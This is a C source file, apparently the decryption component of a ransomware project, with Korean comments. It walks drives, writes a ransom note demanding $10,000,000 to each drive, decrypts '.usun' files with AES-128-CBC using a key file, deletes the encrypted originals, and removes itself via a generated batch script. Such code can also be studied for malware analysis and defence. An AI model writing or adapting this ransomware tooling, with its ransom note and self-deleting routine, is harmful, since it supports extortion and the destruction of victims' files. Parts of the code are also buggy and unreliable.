#define _CRT_SECURE_NO_WARNINGS
#pragma warning(suppress:4996)

#include <stdio.h> 
#include <string.h> 
#include <windows.h> 
#include <io.h>// 파일찾기 

#include<openssl/evp.h>
#include<openssl/rand.h>

#define NUM_BYTES_READ 32
#define PATH_SIZE 1000 

typedef struct _finddata_t FILE_DATA;

void CheckDevice(void);
void FileList(char *path, char* ext, int search);
int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE *ofp, int isEncrypt);
void Kill(void);

unsigned char *key, *iv;

int main(int argc, char** argv) {


	//EVP API를 써서 aes_cbc를 하기위해 초가화 과정
	EVP_CIPHER_CTX *ctx_dec = EVP_CIPHER_CTX_new();

	if (ctx_dec == NULL) {
		printf("EVP_CIPHER_CTX_new is NULL error!!\n");
		return -1;
	}
	if (!(EVP_CipherInit_ex(ctx_dec, EVP_aes_128_cbc(), NULL, NULL, NULL, 0))) {
		printf("EVP_CipherInit_ex error!!\n");
		return -1;
	}

	FILE *keyfp;
	key = (unsigned char*)malloc(EVP_CIPHER_CTX_key_length(ctx_dec));    //key
	iv = (unsigned char*)malloc(EVP_CIPHER_CTX_iv_length(ctx_dec));      //iv

	//여기 체크디바이스로 옮기기
	keyfp = fopen("E:\\usun.bin", "r");
	fread(key, 1, EVP_CIPHER_CTX_key_length(ctx_dec), keyfp);
	fread(iv, 1, EVP_CIPHER_CTX_iv_length(ctx_dec), keyfp);

	fclose(keyfp);
	printf("\n\nDec key : ");
	for (int i = 0; i < EVP_CIPHER_CTX_key_length(ctx_dec); i++)
		printf("0x%X ", key[i]);
	printf("\n\n");

	printf("\n\nDec iv : ");
	for (int i = 0; i < EVP_CIPHER_CTX_iv_length(ctx_dec); i++)
		printf("0x%X ", iv[i]);
	printf("\n\n");


	CheckDevice();

	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE); 
	free(key);
	free(iv);
	fclose(keyfp);
	remove("E:\\usun.bin");

	Kill();
}

void CheckDevice(void) {
	int i;
	char ch = 'Z', pos[50];
	FILE* fp = NULL;

	char *test = "You don't delete Me \n You must send to me $10,000,000\n After call me AAAA@a.a\n good luck";
	while (ch != 'D') {
		printf("%c 드라이브 탐색중...\n", ch);
		sprintf(pos, "%c:\\READ_ME_Warning.txt", ch);

		if ((fp = fopen(pos, "w")) != NULL) {
			sprintf(pos, "%c:", ch);

			fwrite(test, 1, strlen(test), fp);
			printf("%c 디스크 탐색 시작\n", ch);

			for (i = 0; i < 2; i++) {
				FileList(pos, "usun", i);
			}


			remove(pos);

		}
		ch--;
	}
	fclose(fp);
}


//재귀함수 형태로 path 안에 있는 모든 하위 경로 탐색
void FileList(char *path, char* ext, int search) {

	char encPath[PATH_SIZE];
	char decPath[PATH_SIZE];
	char *cp;
	long handle;
	int result = 1;

	FILE_DATA fd;

	//search 0 - 폴더 탐색, search 1 - ext 파일 탐색
	if (search == 0) {
		sprintf(encPath, "%s\\*.", path);
	}
	else {
		sprintf(encPath, "%s\\*.%s", path, ext);
	}

	//Path 폴더를 열고 폴더파일이 있는지 체크
	if ((handle = _findfirst(encPath, &fd)) == -1L) {
		return;
	}

	//하위 경로를 모두 탐색
	while (result != -1) {

		if ((search == 0) && strcmp(fd.name, ".") && strcmp(fd.name, "..")) {
			sprintf(encPath, "%s\\%s", path, fd.name);

			//하위 폴더에 있는 폴더 탐색
			FileList(encPath, ext, 0);
			//하위 폴더에 있는 ext파일 탐색
			FileList(encPath, ext, 1);


		}
		else {

			FILE *ifp, *ofp;
			//파일 출력!! 복호화 시키기	
			sprintf(encPath, "%s\\%s", path, fd.name);
		
			if (!strcmp(fd.name, ".") || !strcmp(fd.name, ".."))
				break;
			if (strpbrk(encPath, ext) == NULL)
				break;

			for (int i = 0; i <= (int)strlen(encPath); i++) {
				decPath[i] = encPath[i];
			}
		
			decPath[strlen(decPath) - 5] = '\0';
			ifp = fopen(encPath, "r");
			ofp = fopen(decPath, "w");
		
			do_crypt(key, iv, ifp, ofp, 0);

			fclose(ifp);
			remove(encPath);
			fclose(ofp);
		}

		//다음 경로로 이동
		result = _findnext(handle, &fd);
	}
	_findclose(handle);
	return;

}

int do_crypt(const unsigned char *key, const unsigned char *iv, FILE *ifp, FILE *ofp, int isEncrypt) {

	rewind(ifp);
	rewind(ofp);

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

	if (ctx == NULL) {
		printf("EVP_CIPHER_CTX_new is NULL error!!\n");
		return -1;
	}

	if (!(EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, isEncrypt))) {
		printf("EVP_CipherInit_ex error!!\n");
		return -1;
	}

	unsigned char *input_buf = (unsigned char*)malloc(NUM_BYTES_READ);
	unsigned char *output_buf = (unsigned char*)malloc(NUM_BYTES_READ + EVP_CIPHER_CTX_block_size(ctx));
	if (input_buf == NULL) {
		printf("cipher_buf_dec allocaion error!! \n");
		return -1;
	}
	if (output_buf == NULL) {
		printf("plain_buf_dec allocaion error!! \n");
		return -1;
	}

	int inlen = 0, outtxtlen = 0;

	while (1) {

		inlen = fread(input_buf, 1, NUM_BYTES_READ, ifp);

		if (inlen <= 0)
			break;
		if (1 != EVP_CipherUpdate(ctx, output_buf, &outtxtlen, input_buf, inlen)) {
			printf("EVP_CipherUpdate error!!! \n");
			return -1;
		}


		fwrite(output_buf, 1, outtxtlen, ofp);
	}

	EVP_CipherFinal(ctx, output_buf, &outtxtlen);
	fwrite(output_buf, 1, outtxtlen, ofp);

	EVP_CIPHER_CTX_free(ctx);
	free(input_buf);
	free(output_buf);



	return 0;
}


void Kill()
{
	FILE *fp = NULL;
	// batch파일명
	char* killer = "killfile.bat";
	
	// 실행파일명
	char* thisFile = "Decryption.exe";
	char szBatFile[256];

	// batch파일을 생성합니다.
	fp = fopen(killer, "wt");
	if (fp == NULL)
	{
		puts("파일생성 실패");
		return;
	}

	// batch파일에 실행할 내용 작성
	wsprintf(szBatFile,
		":Repeat      \r\n"
		"del /f /s /q %s    \r\n"
		"if exist \"%s\" goto Repeat \r\n"
		"del /s /q %s     \r\n",
		thisFile, thisFile, killer);

	fwrite(szBatFile, strlen(szBatFile), 1, fp);
	fclose(fp);

	// batch파일을 실행합니다.
	ShellExecute(NULL, "open", killer, NULL, NULL, 0);
}


